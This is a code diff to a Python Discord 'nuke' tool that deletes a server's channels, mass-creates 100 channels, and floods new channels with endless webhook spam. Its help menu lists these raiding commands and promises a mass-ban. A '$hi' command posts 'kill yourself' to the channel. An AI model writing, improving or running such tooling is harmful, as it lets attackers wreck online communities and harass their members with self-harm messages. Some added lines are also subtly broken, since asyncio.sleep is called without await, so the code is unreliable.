@@ -9,6 +9,7 @@ from discord.ext.commands import CommandNotFound
 import random
 import colorama
 from colorama import Fore, Back, Style
+import asyncio
 
 token = "" #token here
 
@@ -74,7 +75,7 @@ def cdel1():
 
 def chn1():
     try:
-        r = requests.delete(f"https://discord.com/api/v9/channels/{chn_id}", headers=headers, proxies={"http": next(proxy_pool)})
+        r = requests.delete(f"https://discord.com/api/v9/channels/{chn_id}", headers=headers)
         if r.status_code == 429:
             n = r.json()
             time.sleep(n['retry_after'])
@@ -82,6 +83,20 @@ def chn1():
         pass
 
 nuke1 = False
+
+def channel1():
+    payload = {
+        "name": channel_name,
+        "type": "0"
+    }
+    try:
+        for i in range(100):
+            r = requests.post(f"https://discord.com/api/v9/guilds/{sid}/channels", headers=headers, json=payload)
+            if r.status_code == 429:
+                s = r.json()
+                time.sleep(s['retry_after'])
+    except:
+        pass
 
 
 def chnthread():
@@ -103,7 +118,7 @@ async def info(ctx):
     except:
         pass
     try:
-        print(f"\n          there are :\n{len(ctx.guild.channels)} Channels \n{len(ctx.guild.roles)} Roles")
+        print(f"\n          there are :\n           {len(ctx.guild.channels)} Channels \n           {len(ctx.guild.roles)} Roles")
     except:
         pass
 
@@ -218,9 +233,12 @@ async def on_command_error(ctx, a):
 async def on_guild_channel_create(channel):
     global nuke1
     if nuke1 == True:
-        webhook = await channel.create_webhook(name="real")
-        while True:
-            await webhook.send(spam)
+        try:
+            webhook = await channel.create_webhook(name="real")
+            while True:
+                await webhook.send(spam)
+        except:
+            pass
 
 
 @real.command()
@@ -230,12 +248,12 @@ async def rolescan(ctx):
     except:
         pass
     try:
-        print(f"\n{ctx.guild.name}'s roles; \n ================================")
+        print(f"\n             {ctx.guild.name}'s roles; \n           ================================")
         for role in ctx.guild.roles:
-            print(f"  -> {role}")
+            print(f"             -> {role}")
     except:
         pass
-    print("========================\n - P.S : The roles perms are in order (probably).")
+    print("           ========================\n                    - P.S : The roles perms are in order (probably).")
 
 
 @real.command()
@@ -251,12 +269,13 @@ async def cmds(ctx):
 -[ - $cdel [deletes the channels]          ]
 -[ - $cflood [channel spam]                ]
 -[ - $info [number of channels and roles]  ]
--[ - $rolescan [scans roles coz yes]       ]
--[ - $hi [does the funni                   ]
+-[ - $rolescan [gets all roles coz yes]    ]
+-[ - $hi [does the funni]                  ]
 -[ ========================================]
 -[ - will ad a massban soon                ]
+-[ - on a bot is faster than selfbot       ]
 -[ ======================================= ]```""")
-        time.sleep(16)
+        asyncio.sleep(16)
         await a.delete()
     except:
         pass
@@ -268,9 +287,11 @@ async def hi(ctx):
     except:
         pass
     try:
-        await ctx.channel.send("kill yourself")
+        a = await ctx.channel.send("kill yourself")
     except:
         pass
+    asyncio.sleep(3)
+    await a.delete()
 
 
 if user == check():
